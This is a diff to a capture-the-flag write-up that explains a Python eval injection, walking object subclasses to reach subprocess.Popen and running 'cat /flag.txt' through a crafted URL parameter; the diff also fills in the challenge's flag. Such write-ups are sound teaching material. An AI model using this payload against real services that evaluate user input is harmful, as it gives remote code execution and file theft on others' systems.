@@ -26,6 +26,10 @@ Now since everything inherits object, we can get a list of all object subclasses
 
 Now, we can find some useful function, like subprocess.Popen to give us remote code execution.
 
+```py
+"bob".__class__.__mro__[1].__subclasses__()[224]   => <class 'subprocess.Popen'>
+```
+
 ```
 http://7e44b50.0x16.ink/?eval=%27bob%27.__class__.__mro__%5B1%5D.__subclasses__%28%29[224](%22cat%20/flag.txt%22,%20shell=True,%20stdout=-1).communicate() 
 
@@ -38,4 +42,4 @@ http://7e44b50.0x16.ink/?eval='bob'.__class__                   <== get the stri
 Note that the 224 offset may be different depending on the environment. It must be the index that corresponds to Popen.
 
 
-Flag: `placeholder - problem hidden`
+Flag: `CTF{eval_is_never_safe_ever}`
